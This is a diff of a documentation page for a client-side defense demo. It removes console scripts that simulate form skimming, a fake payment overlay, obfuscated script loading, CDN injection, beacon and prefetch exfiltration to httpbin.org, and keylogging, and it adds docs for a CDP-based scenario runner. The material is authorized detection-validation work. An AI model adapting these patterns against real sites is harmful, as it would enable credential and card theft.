@@ -1,655 +1,165 @@
 ---
 title: Attack Script Library
-description: "Pre-built attack script library and custom script authoring for CSD testing"
+description: "Canonical deterministic browser scenarios for authorized CSD validation"
 sidebar:
   order: 9
   label: Attack Script Library
 ---
 
-import { Aside, Code } from "@astrojs/starlight/components";
-import Screenshot from "@f5-sales-demo/docs-theme/components/Screenshot.astro";
+import { Aside } from "@astrojs/starlight/components";
 
-This page provides a library of attack simulation scripts organized by category. Each script is a self-executing function (IIFE) designed to paste into the browser DevTools Console on the demo application. Use these scripts to exercise specific CSD detection capabilities during customer demos.
+The single executable payload source is `scripts/lib/csd-scenarios.mjs`. Run scenarios through
+`scripts/csd-traffic.mjs`; documentation does not contain a second payload implementation. The
+Node.js 22 runner creates an isolated Chrome DevTools Protocol (CDP) context and captures sanitized
+Page, Runtime, Network, and Log/console evidence in a versioned JSON receipt.
 
 <Aside type="caution">
-These scripts are for **authorized pre-production validation only**. All exfiltration targets are safe public endpoints (`www.httpbin.org`, `jsonplaceholder.typicode.com`). All injected scripts load benign libraries from public CDNs.
+  These scenarios are for authorized demo validation against the F5-owned
+  target. They use synthetic markers and reviewed benign destinations only.
+  Receipts retain counts and terminal outcomes, never form values, individual
+  key values, cookies, tokens, headers, storage, or request/response bodies.
 </Aside>
 
-## Safety Rules
-
-All scripts in this library follow these conventions:
-
-- **IIFE format** — self-executing, paste-and-run in DevTools Console
-- **Safe exfil targets** — `www.httpbin.org`, `jsonplaceholder.typicode.com`
-- **Safe script sources** — `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` (loading benign libraries)
-- **`mode: 'no-cors'`** on all fetch calls
-- **`var` declarations** for console compatibility
-- **Console output** prefixed with `[CSD Demo]` and a category tag
-- **No actual malicious payloads**
-
----
-
-## 1. Formjacking &amp; Credential Harvesting
-
-### Login Page Credential Skimmer
-
-**Target page:** `/#/login` — enter dummy credentials before running
-
-**CSD signals:** Form field reads (email, password), network (fetch to external domains)
-
-export const loginSkimmer = `// CSD Demo — Login Credential Skimmer
-(function() {
-    console.log('[CSD Demo]\[Formjack] Starting login credential skimmer...');
-
-    // Read existing form fields (CSD detects field reads on page-load DOM fields)
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
-
-    // Send only synthetic counters; form contents never leave the browser
-    var payload = JSON.stringify({
-        type: 'login_harvest', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-    });
-    fetch('https://www.httpbin.org/post', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Formjack] Synthetic network signal sent to www.httpbin.org');
-    });
-
-    console.log('[CSD Demo][Formjack] Simulation complete.');
-})();`;
-
-<Code code={loginSkimmer} lang="js" title="Login Credential Skimmer" />
-
-**Verify in CSD console:**
-
-- **Script List** — application scripts (e.g., `main.js`) flagged High Risk for reading email and password fields
-- **Form Fields** — email and password shown as Sensitive (by system)
-
-### Registration Page Harvester
-
-**Target page:** `/#/register` — fill in all fields before running
-
-**CSD signals:** Form field reads (email, password, security question)
-
-export const regHarvester = `// CSD Demo — Registration Page Harvester
-(function() {
-    console.log('[CSD Demo]\[Formjack] Starting registration harvester...');
-
-    var inputs = document.querySelectorAll('input, select');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(el) {
-        if (el.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
-
-    var payload = JSON.stringify({
-        type: 'registration_harvest', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-    });
-    fetch('https://jsonplaceholder.typicode.com/posts', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Formjack] Synthetic network signal sent to jsonplaceholder.typicode.com');
-    });
-
-    console.log('[CSD Demo][Formjack] Simulation complete.');
-})();`;
-
-<Code code={regHarvester} lang="js" title="Registration Page Harvester" />
-
-**Verify in CSD console:**
-
-- **Form Fields** — registration fields appear with sensitivity classification
-- **Script List** — scripts reading registration fields flagged for review
-
----
-
-## 2. Digital Skimming
-
-### Payment Page Card Skimmer
-
-**Target page:** `/#/login` (Juice Shop checkout requires authentication — use the login page to demonstrate the overlay technique)
-
-**CSD signals:** Script injection (overlay form), form field reads (original fields)
-
-export const cardSkimmer = `// CSD Demo — Payment Card Skimmer (Overlay Technique)
-(function() {
-    console.log('[CSD Demo]\[Skim] Starting payment card skimmer simulation...');
-
-    // Step 1: Read existing form fields first
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Skim] Observed ' + inputs.length + ' fields; values discarded');
-
-    // Step 2: Inject a fake overlay form (CSD detects the script injection)
-    var overlay = document.createElement('div');
-    overlay.id = 'csd-demo-overlay';
-    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;justify-content:center;';
-    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:100%;">' +
-        '<h3 style="margin:0 0 15px;color:#333;">Payment Verification Required</h3>' +
-        '<p style="color:#666;font-size:14px;">Session expired. Re-enter payment details.</p>' +
-        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">4111-XXXX-XXXX-1111</div>' +
-        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">CVV: ***</div>' +
-        '<div style="text-align:right;margin-top:15px;">' +
-        '<button onclick="document.getElementById(\\'csd-demo-overlay\\').remove();console.log(\\'[CSD Demo][Skim] Overlay dismissed\\');" style="padding:8px 20px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;">Verify</button></div></div>';
-    document.body.appendChild(overlay);
-    console.log('[CSD Demo][Skim] Fake payment overlay injected into DOM');
-
-    // Step 3: Send a synthetic network signal without captured data
-    var payload = JSON.stringify({
-        type: 'card_skim', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-    });
-    fetch('https://www.httpbin.org/post', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Skim] Synthetic network signal sent to www.httpbin.org');
-    });
-
-    console.log('[CSD Demo][Skim] Simulation complete. Click "Verify" on the overlay to dismiss it.');
-})();`;
-
-<Code code={cardSkimmer} lang="js" title="Payment Card Skimmer (Overlay)" />
-
-<Screenshot light="/images/attack-overlay-card.png" dark="/images/attack-overlay-card.png" alt="Payment overlay injected by card skimmer script" />
-
-**Verify in CSD console:**
-
-- **Script List** — scripts flagged for DOM manipulation and field reads
-- **Form Fields** — original page fields shown with read activity
-
-### Multi-Stage Obfuscated Loader
-
-**Target page:** Any page on the demo site
-
-**CSD signals:** Script injection (decoded payload creates new script tag)
-
-export const obfuscatedLoader = `// CSD Demo — Multi-Stage Obfuscated Loader
-(function() {
-    console.log('[CSD Demo]\[Skim] Starting obfuscated loader simulation...');
-
-    // Stage 1: Base64-encoded script URL (simulates obfuscation)
-    var encoded = btoa('https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js');
-    console.log('[CSD Demo][Skim] Stage 1: Encoded payload:', encoded);
-
-    // Stage 2: Decode and inject
-    var decoded = atob(encoded);
-    console.log('[CSD Demo][Skim] Stage 2: Decoded URL:', decoded);
-
-    var script = document.createElement('script');
-    script.src = decoded;
-    script.onload = function() {
-        console.log('[CSD Demo][Skim] Stage 3: Decoded script loaded successfully from', decoded);
-    };
-    script.onerror = function() {
-        console.log('[CSD Demo][Skim] Stage 3: Script load attempted (may be blocked by CSP)');
-    };
-    document.head.appendChild(script);
-
-    console.log('[CSD Demo][Skim] Simulation complete. CSD detects the injected script tag regardless of encoding.');
-})();`;
-
-<Code code={obfuscatedLoader} lang="js" title="Multi-Stage Obfuscated Loader" />
-
-**Verify in CSD console:**
-
-- **Script List** — `cdn.jsdelivr.net` script appears as new entry
-- **Network** — `cdn.jsdelivr.net` domain listed
-
----
-
-## 3. Supply Chain &amp; Script Injection
-
-### Multi-CDN Injection
-
-**Target page:** Any page on the demo site
-
-**CSD signals:** Script injection (4 new third-party script tags), network (4 new domains)
-
-export const multiCdn = `// CSD Demo — Multi-CDN Script Injection
-(function() {
-    console.log('[CSD Demo]\[Supply Chain] Starting multi-CDN injection...');
-
-    var cdns = [
-        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
-        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
-        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
-        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
-    ];
-
-    cdns.forEach(function(cdn) {
-        var script = document.createElement('script');
-        script.src = cdn.url;
-        script.type = 'module';
-        script.onload = function() {
-            console.log('[CSD Demo][Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
-        };
-        script.onerror = function() {
-            console.log('[CSD Demo][Supply Chain] Load attempted from ' + cdn.name + ' (may be blocked)');
-        };
-        document.head.appendChild(script);
-        console.log('[CSD Demo][Supply Chain] Injected script tag: ' + cdn.name);
-    });
-
-    console.log('[CSD Demo][Supply Chain] 4 third-party scripts injected. CSD will detect all 4 new domains.');
-})();`;
-
-<Code code={multiCdn} lang="js" title="Multi-CDN Script Injection" />
-
-**Verify in CSD console:**
-
-- **Script List** — 4 new script entries from `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`
-- **Network** — all 4 CDN domains appear in the All Domains list
-
-### Tag Manager Hijack Simulation
-
-**Target page:** Any page on the demo site
-
-**CSD signals:** Script injection (fake analytics/tag manager script)
-
-export const tagManagerHijack = `// CSD Demo — Tag Manager Hijack
-(function() {
-    console.log('[CSD Demo]\[Supply Chain] Starting tag manager hijack simulation...');
-
-    // Simulate a compromised tag manager loading a malicious analytics script
-    var fakeTag = document.createElement('script');
-    fakeTag.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js';
-    fakeTag.setAttribute('data-tag-manager', 'hijacked');
-    fakeTag.onload = function() {
-        console.log('[CSD Demo][Supply Chain] Fake analytics script loaded via tag manager hijack');
-
-        // After loading, read form fields (simulating data collection by compromised tag)
-        var inputs = document.querySelectorAll('input');
-        var populatedFieldCount = 0;
-        inputs.forEach(function(input) {
-            if (input.value) populatedFieldCount++;
-        });
-        console.log('[CSD Demo][Supply Chain] Compromised tag observed ' + inputs.length + ' fields; values discarded');
-    };
-    fakeTag.onerror = function() {
-        console.log('[CSD Demo][Supply Chain] Script load attempted (may be blocked)');
-    };
-    document.head.appendChild(fakeTag);
-
-    console.log('[CSD Demo][Supply Chain] Tag manager hijack simulation complete.');
-})();`;
-
-<Code code={tagManagerHijack} lang="js" title="Tag Manager Hijack" />
-
-**Verify in CSD console:**
-
-- **Script List** — new script from `cdn.jsdelivr.net` with `chart.js` path
-- **Form Fields** — if run on a page with forms, field read activity increases
-
----
-
-## 4. Data Exfiltration Channels
-
-### Multi-Channel Exfiltration
-
-**Target page:** `/#/login` — enter dummy credentials before running
-
-**CSD signals:** Form field reads, network (fetch source domain)
-
-export const multiChannel = `// CSD Demo — Multi-Channel Exfiltration
-(function() {
-    console.log('[CSD Demo]\[Exfil] Starting multi-channel exfiltration...');
-
-    // Read form fields for detection, then discard their contents
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Exfil] Observed ' + inputs.length + ' fields; values discarded');
-    var payload = JSON.stringify({
-        type: 'multi_channel', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-    });
-
-    // Channel 1: Fetch POST
-    fetch('https://www.httpbin.org/post', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Exfil] Channel 1 (fetch POST) sent to www.httpbin.org');
-    });
-
-    // Channel 2: Image beacon
-    var img = new Image();
-    img.src = 'https://www.httpbin.org/get?data=' + encodeURIComponent(payload).substring(0, 200);
-    img.onload = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) sent to www.httpbin.org'); };
-    img.onerror = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) attempted'); };
-    console.log('[CSD Demo][Exfil] Channel 2 (image beacon) initiated');
-
-    // Channel 3: Link prefetch
-    var link = document.createElement('link');
-    link.rel = 'prefetch';
-    link.href = 'https://jsonplaceholder.typicode.com/posts?exfil=' + encodeURIComponent(payload).substring(0, 200);
-    document.head.appendChild(link);
-    console.log('[CSD Demo][Exfil] Channel 3 (link prefetch) injected');
-
-    console.log('[CSD Demo][Exfil] 3 exfil channels attempted. Note: CSD Network view tracks script source domains, not fetch/beacon destinations.');
-})();`;
-
-<Code code={multiChannel} lang="js" title="Multi-Channel Exfiltration" />
-
-<Aside type="note">
-Exfiltration targets (`www.httpbin.org`, `jsonplaceholder.typicode.com`) will **not** appear in the CSD Network view — only script-load source domains are shown. The primary detection signal here is **form field reads**. See [Detection Boundaries](/csd/en/overview/#detection-boundaries) for details.
-</Aside>
-
-**Verify in CSD console:**
-
-- **Form Fields** — email and password fields show read activity
-- **Script List** — application scripts flagged for field reads
-
-### High-Volume Domain Exfiltration
-
-**Target page:** `/#/login` — enter dummy credentials before running
-
-**CSD signals:** Form field reads, script injection (script tags from multiple domains)
-
-export const highVolume = `// CSD Demo — High-Volume Domain Exfiltration
-(function() {
-    console.log('[CSD Demo]\[Exfil] Starting high-volume exfiltration simulation...');
-
-    // Read form fields for detection, then discard their contents
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Exfil] Observed ' + inputs.length + ' fields; values discarded');
-
-    // Inject scripts from multiple CDN domains (these WILL appear in CSD Network view)
-    var sources = [
-        'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
-        'https://esm.sh/moment@2.30.1',
-        'https://unpkg.com/underscore@1.13.7/underscore-min.js',
-        'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js',
-        'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js'
-    ];
-
-    sources.forEach(function(src, i) {
-        var script = document.createElement('script');
-        script.src = src;
-        script.type = 'module';
-        script.onload = function() {
-            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + '/' + sources.length + ' loaded: ' + src);
-        };
-        script.onerror = function() {
-            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + ' load attempted');
-        };
-        document.head.appendChild(script);
-    });
-
-    // Also send via fetch to safe endpoints
-    var payload = JSON.stringify({
-        type: 'high_volume', field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true, timestamp: Date.now()
-    });
-    fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
-    fetch('https://jsonplaceholder.typicode.com/posts', { method: 'POST', mode: 'no-cors', body: payload });
-
-    console.log('[CSD Demo][Exfil] ' + sources.length + ' script injections + 2 fetch channels. Script domains will appear in CSD Network view.');
-})();`;
-
-<Code code={highVolume} lang="js" title="High-Volume Domain Exfiltration" />
-
-**Verify in CSD console:**
-
-- **Script List** — 5 new third-party script entries
-- **Network** — `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` domains listed
-- **Form Fields** — login fields show read activity
-
----
-
-## 5. DOM Manipulation &amp; Overlay
-
-### Form Overlay Attack
-
-**Target page:** `/#/login`
-
-**CSD signals:** Form field reads (reads original fields before overlaying)
-
-export const formOverlay = `// CSD Demo — Form Overlay Attack
-(function() {
-    console.log('[CSD Demo]\[DOM] Starting form overlay attack...');
-
-    // Read the real form fields first
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][DOM] Observed ' + inputs.length + ' fields; values discarded');
-
-    // Find the form container and overlay it
-    var form = document.querySelector('form') || document.querySelector('[class*="login"]') || document.querySelector('mat-card');
-    if (form) {
-        var rect = form.getBoundingClientRect();
-        var overlay = document.createElement('div');
-        overlay.id = 'csd-demo-form-overlay';
-        overlay.style.cssText = 'position:fixed;top:' + rect.top + 'px;left:' + rect.left + 'px;width:' + rect.width + 'px;height:' + rect.height + 'px;background:white;z-index:99999;display:flex;flex-direction:column;justify-content:center;padding:20px;box-sizing:border-box;border:2px solid #e0e0e0;border-radius:8px;';
-        overlay.innerHTML = '<h4 style="margin:0 0 10px;color:#333;">Sign In</h4>' +
-            '<input type="email" placeholder="Email" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
-            '<input type="password" placeholder="Password" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
-            '<button onclick="document.getElementById(\\'csd-demo-form-overlay\\').remove();console.log(\\'[CSD Demo][DOM] Overlay dismissed\\');" style="margin-top:10px;padding:8px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">Log in</button>';
-        document.body.appendChild(overlay);
-        console.log('[CSD Demo][DOM] Transparent overlay form placed over real login form');
-    } else {
-        console.log('[CSD Demo][DOM] No form container found — overlay skipped');
-    }
-
-    console.log('[CSD Demo][DOM] Simulation complete. The overlay captures input instead of the real form.');
-})();`;
-
-<Code code={formOverlay} lang="js" title="Form Overlay Attack" />
-
-<Screenshot light="/images/attack-overlay-form.png" dark="/images/attack-overlay-form.png" alt="Fake login form overlaying the real form" />
-
-<Aside type="note">
-CSD does **not** track dynamically created form fields. The overlay's injected `input` elements will not appear in the CSD Form Fields view. CSD detects this attack through the **original field reads** that happen before the overlay is placed.
-</Aside>
-
-**Verify in CSD console:**
-
-- **Form Fields** — original email and password fields show read activity
-- **Script List** — scripts flagged for field access
-
-### Keylogger Simulation
-
-**Target page:** `/#/login`
-
-**CSD signals:** Form field reads (accesses input elements to attach listeners)
-
-export const keylogger = `// CSD Demo — Keylogger Simulation
-(function() {
-    console.log('[CSD Demo]\[DOM] Starting keylogger simulation...');
-
-    var keystrokeCount = 0;
-    var flushInterval = 5000;
-
-    // Count keydown events without retaining keys or target identity
-    document.addEventListener('keydown', function() {
-        keystrokeCount++;
-        if (keystrokeCount % 10 === 0) {
-            console.log('[CSD Demo][DOM] Keydown events observed:', keystrokeCount);
-        }
-    });
-    console.log('[CSD Demo][DOM] Keydown listener attached to document');
-
-    // Access form field values for detection, then discard them
-    var inputs = document.querySelectorAll('input');
-    inputs.forEach(function(input) {
-        void input.value;
-    });
-    console.log('[CSD Demo][DOM] Monitoring ' + inputs.length + ' fields; values discarded');
-
-    // Periodic flush simulation
-    var flushCount = 0;
-    var interval = setInterval(function() {
-        flushCount++;
-        if (keystrokeCount > 0) {
-            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keystrokeCount, 'events observed');
-            fetch('https://www.httpbin.org/post', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    type: 'keylog', keystroke_count: keystrokeCount,
-                    key_values_discarded: true, timestamp: Date.now()
-                })
-            });
-            keystrokeCount = 0;
-        }
-        if (flushCount >= 6) {
-            clearInterval(interval);
-            console.log('[CSD Demo][DOM] Keylogger simulation ended (30s max duration)');
-        }
-    }, flushInterval);
-
-    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see event counts.');
-})();`;
-
-<Code code={keylogger} lang="js" title="Keylogger Simulation" />
-
-**Verify in CSD console:**
-
-- **Form Fields** — input fields show read activity from the monitoring script
-- **Script List** — scripts flagged for accessing form field values
-
----
-
-## 6. Combined Stress Test
-
-### Maximum Detection Script
-
-This script combines all attack vectors into a single IIFE — the "ultimate demo" script. Run this when you want to trigger every CSD detection signal in one execution.
-
-**Target page:** `/#/login` — enter dummy credentials before running
-
-**CSD signals:** Form field reads, script injection (4 CDN domains), network (4 new domains)
-
-export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress Test)
-(function() {
-    console.log('='.repeat(60));
-    console.log('[CSD Demo] MAXIMUM DETECTION — Combined Stress Test');
-    console.log('='.repeat(60));
-
-    // Phase 1: Form Field Harvesting
-    console.log('\\n--- Phase 1: Form Field Harvesting ---');
-    var inputs = document.querySelectorAll('input');
-    var populatedFieldCount = 0;
-    inputs.forEach(function(input) {
-        if (input.value) populatedFieldCount++;
-    });
-    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
-
-    // Phase 2: Multi-CDN Script Injection
-    console.log('\\n--- Phase 2: Supply Chain — Multi-CDN Injection ---');
-    var cdns = [
-        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr (lodash)' },
-        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh (moment)' },
-        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg (underscore)' },
-        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm (dayjs)' }
-    ];
-    cdns.forEach(function(cdn) {
-        var script = document.createElement('script');
-        script.src = cdn.url;
-        script.type = 'module';
-        script.onload = function() {
-            console.log('[CSD Demo][Supply Chain] Loaded: ' + cdn.name);
-        };
-        script.onerror = function() {
-            console.log('[CSD Demo][Supply Chain] Load attempted: ' + cdn.name);
-        };
-        document.head.appendChild(script);
-        console.log('[CSD Demo][Supply Chain] Injected: ' + cdn.name);
-    });
-
-    // Phase 3: Data Exfiltration (multiple channels)
-    console.log('\\n--- Phase 3: Data Exfiltration ---');
-    var payload = JSON.stringify({
-        type: 'max_detection',
-        field_count: inputs.length,
-        populated_field_count: populatedFieldCount,
-        field_values_discarded: true,
-        timestamp: Date.now()
-    });
-
-    // Fetch POST
-    fetch('https://www.httpbin.org/post', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Exfil] Fetch POST sent to www.httpbin.org');
-    });
-
-    // Fetch POST (second endpoint)
-    fetch('https://jsonplaceholder.typicode.com/posts', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload
-    }).then(function() {
-        console.log('[CSD Demo][Exfil] Fetch POST sent to jsonplaceholder.typicode.com');
-    });
-
-    // Image beacon
-    var img = new Image();
-    img.src = 'https://www.httpbin.org/get?beacon=' + encodeURIComponent(payload).substring(0, 200);
-    console.log('[CSD Demo][Exfil] Image beacon sent to www.httpbin.org');
-
-    // Phase 4: DOM Manipulation
-    console.log('\\n--- Phase 4: DOM Manipulation ---');
-    var banner = document.createElement('div');
-    banner.id = 'csd-demo-banner';
-    banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;padding:12px;background:#d32f2f;color:white;text-align:center;z-index:99999;font-family:sans-serif;font-size:14px;';
-    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + inputs.length + ' fields observed ' +
-        '<button onclick="document.getElementById(\\'csd-demo-banner\\').remove();" style="margin-left:15px;padding:4px 12px;background:white;color:#d32f2f;border:none;border-radius:3px;cursor:pointer;">Dismiss</button>';
-    document.body.appendChild(banner);
-    console.log('[CSD Demo][DOM] Attack status banner injected');
-
-    // Summary
-    console.log('\\n' + '='.repeat(60));
-    console.log('[CSD Demo] SIMULATION COMPLETE');
-    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
-    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (from ' + cdns.length + ' CDN domains)');
-    console.log('[CSD Demo] Exfil channels: 3 (2x fetch + 1x image beacon)');
-    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in CSD console.');
-    console.log('='.repeat(60));
-})();`;
-
-<Code code={maxDetection} lang="js" title="Maximum Detection — Combined Stress Test" />
-
-<Screenshot light="/images/attack-stress-test-output-light.png" dark="/images/attack-stress-test-output-dark.png" alt="Console output from maximum detection script" />
-
-**Verify in CSD console (after 5-10 minutes):**
-
-- **Dashboard** — Transactions Consumed counter increments
-- **Script List** — application scripts flagged High Risk; 4 new third-party scripts from CDN domains
-- **Form Fields** — email and password classified as Sensitive (by system) with read activity
-- **Network** — `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` appear in All Domains
-- **Affected Users** — your session appears with IP, geolocation, browser, device info
+## Prerequisites
+
+- Node.js 22 or newer.
+- Chrome or Chromium listening on a loopback remote-debugging endpoint.
+- The protected HTTPS page contains the injected `__imp_apg__` instrumentation.
+- The default target is `https://client-side-defense.f5-sales-demo.com`.
+
+On macOS, start a dedicated Chrome profile:
+
+```bash
+open -na "Google Chrome" --args \
+  --remote-debugging-port=9222 \
+  --user-data-dir="$TMPDIR/csd-demo-chrome"
+```
+
+The runner owns and disposes its isolated context and page. It does not close the external browser.
+
+## Canonical CLI
+
+```text
+node scripts/csd-traffic.mjs --list
+node scripts/csd-traffic.mjs --scenario <name> [--scenario <name> ...]
+node scripts/csd-traffic.mjs --all
+node scripts/csd-traffic.mjs --target <https-url>
+node scripts/csd-traffic.mjs --cdp-endpoint <http-or-ws-endpoint>
+node scripts/csd-traffic.mjs --timeout <duration>
+node scripts/csd-traffic.mjs --settle <duration>
+node scripts/csd-traffic.mjs --receipt <path|->
+node scripts/csd-traffic.mjs --allow-host <exact-hostname>
+node scripts/csd-traffic.mjs --print-script <scenario>
+node scripts/csd-traffic.mjs --help
+```
+
+`--scenario` is repeatable. An execution requires exactly one selector form: one or more
+`--scenario` values, or `--all`. There is no implicit execution selector. `--list`,
+`--print-script`, and `--help` are nonexecution modes. Durations accepted by `--timeout` and
+`--settle` are validated duration values, not platform-detection promises.
+
+List the stable scenarios without connecting to Chrome:
+
+```bash
+node scripts/csd-traffic.mjs --list
+```
+
+Run one scenario and write an atomic receipt:
+
+```bash
+mkdir -p .artifacts/csd
+node scripts/csd-traffic.mjs \
+  --scenario login-credential-skimmer \
+  --cdp-endpoint http://127.0.0.1:9222 \
+  --timeout 30s \
+  --settle 10s \
+  --receipt .artifacts/csd/login-credential-skimmer.json
+```
+
+Run multiple selected scenarios by repeating the selector:
+
+```bash
+node scripts/csd-traffic.mjs \
+  --scenario login-credential-skimmer \
+  --scenario payment-overlay-card-skimmer \
+  --receipt .artifacts/csd/focused-scenarios.json
+```
+
+Run the complete manifest with `--all`:
+
+```bash
+node scripts/csd-traffic.mjs \
+  --all \
+  --receipt .artifacts/csd/all-scenarios.json
+```
+
+To stream the receipt, use `--receipt -`. Stdout then contains only the JSON receipt; all human
+logs go to stderr, so piping stdout to `jq` is safe:
+
+```bash
+node scripts/csd-traffic.mjs \
+  --scenario maximum-detection \
+  --receipt - \
+  | jq '{schema_version, run_id, requested_scenarios, success, eventual_csd_evidence}'
+```
+
+A custom target requires `--target` and an exact repeatable `--allow-host`. The target guard rejects
+HTTP, IP literals, credentials, wildcards, suffix matches, non-default ports, unauthorized
+redirects, and a final document origin outside the exact allowlist.
+
+## Manual fallback
+
+Generate the reviewed payload from the canonical module:
+
+```bash
+node scripts/csd-traffic.mjs \
+  --print-script maximum-detection \
+  > .artifacts/csd/maximum-detection.browser.js
+```
+
+Review the generated file, open its documented route in the dedicated profile, and paste it into
+DevTools Console. `--print-script` is the only manual payload source. Manual execution can record
+visible Console and Network behavior, but cannot provide the runner's complete receipt or cleanup
+proof.
+
+## Scenario evidence matrix
+
+<!-- markdownlint-disable MD013 -->
+
+| Stable scenario                   | Route         | Browser behavior                                                                                                                                                               | Immediate receipt evidence                                                                                                            | Eventual CSD evidence                                                          | Claim boundary                                                                                           |
+| --------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
+| `login-credential-skimmer`        | `/#/login`    | Wait for login inputs, use native setters for synthetic markers, read counts/populated state, discard values, and POST synthetic counters to `www.httpbin.org`.                | Fields found; total/populated counts; native-setter and discard markers; fetch attempt and terminal Network state; completion marker. | Matching field/script observations and/or the run's reviewed destination.      | Browser evidence proves field/network activity, not a fixed-time risk label or field classification.     |
+| `registration-harvester`          | `/#/register` | Wait for inputs/selects, populate documented synthetic placeholders with native setters, count/read, discard values, and POST counters to `jsonplaceholder.typicode.com`.      | Controls found; counts; native-setter and discard markers; fetch terminal state; completion marker.                                   | Matching form-field/script telemetry and destination if observed.              | Do not claim every registration field is classified or visible in bounded time.                          |
+| `payment-overlay-card-skimmer`    | `/#/login`    | Count original fields, inject a run-scoped payment overlay containing masked display-only card evidence, POST counters to `www.httpbin.org`, then remove it.                   | Original-field count; overlay presence; masked-only fixture assertion; fetch terminal state; overlay cleanup.                         | Original-field/script observations and destination if observed.                | No card data is entered or retained; rendering is not proof of injected-form detection.                  |
+| `obfuscated-loader`               | `/`           | Base64 encode and decode the fixed benign jsDelivr Lodash URL, verify equality, then inject one script.                                                                        | Encoded/decoded equality; element insertion; response, loading-failed, or timed-out terminal outcome; cleanup.                        | Matching script/domain record if observed.                                     | Obfuscation and the attempted injection are proven; classification is asynchronous.                      |
